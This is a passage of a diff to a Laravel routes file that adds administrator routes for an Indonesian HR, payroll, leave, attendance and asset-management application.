+	Route::resource('karyawan', $path . 'KaryawanController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('department', $path . 'DepartmentController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('jabatan', $path . 'JabatanController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('provinsi', $path . 'ProvinsiController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('kabupaten', $path . 'KabupatenController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('kecamatan', $path . 'KecamatanController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('kelurahan', $path . 'KelurahanController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('training', $path . 'TrainingController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('cuti', $path . 'CutiController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('overtime', $path . 'OvertimeController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('payment-request', $path . 'PaymentRequestController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('exit-clearance', $path . 'ExitClearanceController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('exit-interview', $path . 'ExitInterviewController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('compassionate-reason', $path . 'CompassionateReasonController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('medical-reimbursement', $path . 'MedicalReimbursementController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('directorate', $path . 'DirectorateController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('division', $path . 'DivisionController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('section', $path . 'SectionController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('overtime', $path . 'OvertimeController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('cabang', $path . 'CabangController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('medical', $path . 'MedicalController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('bank', $path . 'BankController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('universitas', $path . 'UniversitasController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('program-studi', $path . 'ProgramStudiController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('jurusan', $path . 'JurusanController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('sekolah', $path . 'SekolahController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('payment-request-setting', $path . 'PaymentRequestSettingController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('alasan-pengunduran-diri', $path . 'AlasanPengunduranDiriSettingController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+		
+	Route::get('training/detail/{id}',  $path . 'TrainingController@detail')->name('administrator.training.detail');
+	Route::post('training/proses',  $path . 'TrainingController@proses')->name('administrator.training.proses');
+	Route::get('training/biaya/{id}',  $path . 'TrainingController@biaya')->name('administrator.training.biaya');
+	Route::post('training/proses-biaya',  $path . 'TrainingController@prosesBiaya')->name('administrator.training.proses-biaya');
+
+	Route::resource('setting-cuti', $path . 'SettingCutiController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('setting-payment-request', $path . 'SettingPaymentRequestController', ['only'=> ['index','destroy'], 'as' => 'administrator']);
+	Route::resource('setting-medical', $path . 'SettingMedicalController', ['only'=> ['index','destroy'], 'as' => 'administrator']);
+	Route::resource('setting-overtime', $path . 'SettingOvertimeController', ['only'=> ['index','destroy'], 'as' => 'administrator']);
+	Route::resource('setting-exit', $path . 'SettingExitController', ['only'=> ['index','destroy'], 'as' => 'administrator']);
+	Route::resource('setting-training', $path . 'SettingTrainingController', ['only'=> ['index','destroy'], 'as' => 'administrator']);
+	Route::resource('setting-master-cuti', $path . 'SettingMasterCutiController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('setting-exit-clearance', $path . 'SettingExitClearanceController', ['as' => 'administrator']);
+	Route::resource('cuti-bersama', $path . 'CutiBersamaController', ['as' => 'administrator']);
+
+	Route::get('structure', $path .'IndexController@structure')->name('administrator.structure');
+	
+	Route::resource('setting', $path .'SettingController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('news', $path .'NewsController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('internal-memo', $path .'InternalMemoController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('branch-organisasi', $path .'BranchOrganisasiController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('branch-staff', $path .'BranchStaffController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('libur-nasional', $path .'LiburNasionalController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('plafond-dinas', $path .'PlafondDinasController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('position', $path .'PositionController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('job-rule', $path .'JobRuleController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::post('libur-nasional/import', $path .'LiburNasionalController@import')->name('administrator.libur-nasional.import');
+	Route::post('cabang/import', $path .'CabangController@import')->name('administrator.cabang.import');
+	Route::post('plafond-dinas/import', $path .'PlafondDinasController@import')->name('administrator.plafond-dinas.import');
+	Route::post('plafond-dinas/destroy-luar-negeri', $path .'PlafondDinasController@deleteLuarNegeri')->name('administrator.plafond-dinas.destroy-luar-negeri');
+	Route::post('plafond-dinas/edit-luar-negeri/{id}', $path .'PlafondDinasController@editLuarNegeri')->name('administrator.plafond-dinas.edit-luar-negeri');
+	Route::get('branch-organisasi/tree', $path .'BranchOrganisasiController@tree')->name('administrator.branch-organisasi.tree');
+
+	Route::get('karyawan/delete-cuti/{id}', $path .'KaryawanController@DeleteCuti')->name('administrator.karyawan.delete-cuti');
+	Route::post('karyawan/import', $path .'KaryawanController@importData')->name('administrator.karyawan.import');
+	Route::get('karyawan/preview-import', $path .'KaryawanController@previewImport')->name('administrator.karyawan.preview-import');
+	Route::get('karyawan/delete-temp/{id}', $path .'KaryawanController@deleteTemp')->name('administrator.karyawan.delete-temp');
+	Route::get('karyawan/detail-temp/{id}', $path .'KaryawanController@detailTemp')->name('administrator.karyawan.detail-temp');
+	Route::get('karyawan/import-all', $path .'KaryawanController@importAll')->name('administrator.karyawan.import-all');
+	Route::get('karyawan/print-profile/{id}', $path .'KaryawanController@printProfile')->name('administrator.karyawan.print-profile');
+	Route::get('karyawan/delete-old-user/{id}', $path .'KaryawanController@deleteOldUser')->name('administrator.karyawan.delete-old-user');
+
+	Route::get('absensi/index', $path .'AbsensiController@index')->name('administrator.absensi.index');
+	Route::get('absensi/import', $path .'AbsensiController@import')->name('administrator.absensi.import');
+	Route::post('absensi/temp-import', $path .'AbsensiController@tempImport')->name('administrator.absensi.temp-import');
+	Route::get('absensi/preview-temp', $path .'AbsensiController@previewTemp')->name('administrator.absensi.preview-temp');
+	Route::get('absensi/import-all', $path .'AbsensiController@importAll')->name('administrator.absensi.import-all');
+	Route::get('absensi/deletenew/{id}', $path .'AbsensiController@deleteNew')->name('administrator.absensi.deletenew');
+	Route::get('absensi/deleteold/{id}', $path .'AbsensiController@deleteOld')->name('administrator.absensi.deleteold');
+	Route::post('cuti/batal', $path .'CutiController@batal')->name('administrator.cuti.batal');
+	Route::post('training/batal', $path .'TrainingController@batal')->name('administrator.training.batal');
+	Route::get('cuti/proses/{id}', $path .'CutiController@proses')->name('administrator.cuti.proses');
+	Route::post('cuti/submit-proses', $path .'CutiController@submitProses')->name('administrator.cuti.submit-proses');
+	Route::post('payment-request/batal', $path .'PaymentRequestController@batal')->name('administrator.payment-request.batal');
+
+	Route::get('exit-inteview/detail/{id}',  $path . 'ExitInterviewController@detail')->name('administrator.exit-interview.detail');
+	Route::post('exit-interview/proses',  $path . 'ExitInterviewController@proses')->name('administrator.exit-interview.proses');
+	Route::get('cuti/delete/{id}',  $path . 'CutiController@delete')->name('administrator.cuti.delete');
+	Route::get('setting-master-cuti/delete/{id}',  $path . 'SettingMasterCutiController@delete')->name('administrator.setting-master-cuti.delete');
+	Route::resource('peraturan-perusahaan', $path .'PeraturanPerusahaanController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+
+	Route::resource('payroll', $path .'PayrollController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+
+	#Route::match(array('GET', 'POST'), 'payroll', $path . 'PayrollController@index');
+
+	Route::get('payroll/import', $path .'PayrollController@import')->name('administrator.payroll.import');
+	Route::get('payroll/download', $path .'PayrollController@download')->name('administrator.payroll.download');
+	Route::post('payroll/temp-import', $path .'PayrollController@tempImport')->name('administrator.payroll.temp-import');
+	Route::get('payroll-setting', $path .'PayrollSettingController@index')->name('administrator.payroll-setting.index');
+
+	Route::get('payroll-setting/delete-ptkp/{id}', $path. 'PayrollSettingController@deletePtkp')->name('administrator.payroll-setting.delete-ptkp');
+
+	//SETTING PPH
+	Route::get('payroll-setting/add-pph', $path .'PayrollSettingController@addPPH')->name('administrator.payroll-setting.add-pph');
+	Route::get('payroll-setting/edit-pph/{id}', $path .'PayrollSettingController@editPPH')->name('administrator.payroll-setting.edit-pph');
+	Route::post('payroll-setting/store-pph', $path .'PayrollSettingController@storePPH')->name('administrator.payroll-setting.store-pph');
+	Route::post('payroll-setting/update-pph/{id}', $path .'PayrollSettingController@updatePPH')->name('administrator.payroll-setting.update-pph');
+	Route::get('payroll-setting/delete-pph/{id}', $path. 'PayrollSettingController@deletePPH')->name('administrator.payroll-setting.delete-pph');
+
+	// SETTING OTHERS
+	Route::get('payroll-setting/delete-others/{id}', $path. 'PayrollSettingController@deleteOthers')->name('administrator.payroll-setting.delete-others');
+	Route::get('payroll-setting/add-others', $path .'PayrollSettingController@addOthers')->name('administrator.payroll-setting.add-others');
+	Route::get('payroll-setting/edit-others/{id}', $path .'PayrollSettingController@editOthers')->name('administrator.payroll-setting.edit-others');
+	Route::post('payroll-setting/update-others/{id}', $path .'PayrollSettingController@updateOthers')->name('administrator.payroll-setting.update-others');
+
+	Route::get('payroll-setting/edit-ptkp/{id}', $path .'PayrollSettingController@editPtkp')->name('administrator.payroll-setting.edit-ptkp');
+	Route::post('payroll-setting/update-ptkp/{id}', $path .'PayrollSettingController@updatePtkp')->name('administrator.payroll-setting.update-ptkp');
+	Route::post('payroll-setting/store-others', $path .'PayrollSettingController@storeOthers')->name('administrator.payroll-setting.store-others');
+	Route::get('payroll/calculate', $path .'PayrollController@calculate')->name('administrator.payroll.calculate');
+	Route::get('payroll/detail/{id}', $path .'PayrollController@detail')->name('administrator.payroll.detail');
+	Route::resource('asset', $path .'AssetController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('asset-tracking', $path .'AssetTrackingController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('asset-type', $path .'AssetTypeController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::get('setting', $path. 'IndexController@setting')->name('administrator.setting.index');
+	Route::post('karyawan/upload-dokument-file', $path.'KaryawanController@uploadDokumentFile')->name('administrator.karyawan.upload-dokument-file');
+	Route::post('karyawan/generate-dokument-file', $path.'KaryawanController@generateDocumentFile')->name('administrator.karyawan.generate-dokument-file');
+	Route::get('karyawan/print-payslip/{id}', $path.'KaryawanController@printPayslip')->name('administrator.karyawan.print-payslip');
+	Route::get('request-pay-slip', $path.'RequestPaySlipController@index')->name('administrator.request-pay-slip.index');
+	Route::get('request-pay-slip/proses/{id}', $path.'RequestPaySlipController@proses')->name('administrator.request-pay-slip.proses');
+	Route::post('request-pay-slip/submit/{id}', $path.'RequestPaySlipController@submit')->name('administrator.request-pay-slip.submit');
+	Route::get('karyawan/delete-dependent/{id}', $path.'KaryawanController@deleteDependent')->name('administrator.karyawan.delete-dependent');
+	Route::get('karyawan/delete-education/{id}', $path.'KaryawanController@deleteEducation')->name('administrator.karyawan.delete-education');
+	Route::get('karyawan/delete-inventaris/{id}', $path.'KaryawanController@deleteInventaris')->name('administrator.karyawan.delete-inventaris');
+	Route::get('karyawan/delete-inventaris-mobil/{id}', $path.'KaryawanController@deleteInventarisMobil')->name('administrator.karyawan.delete-inventaris-mobil');
+	Route::get('karyawan/delete-inventaris-lainnya/{id}', $path.'KaryawanController@deleteInventarisLainnya')->name('administrator.karyawan.delete-inventaris-lainnya');
+
+	Route::resource('empore-direktur', $path .'EmporeDirekturController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('empore-manager', $path .'EmporeManagerController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::resource('empore-staff', $path .'EmporeStaffController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'administrator']);
+	Route::get('payroll/index', $path .'PayrollController@index')->name('administrator.payroll.index');
+	Route::post('payroll/index', $path .'PayrollController@index')->name('administrator.payroll.index');
+	Route::get('karyawan/autologin/{id}', $path .'KaryawanController@autologin')->name('administrator.karyawan.autologin');
+});
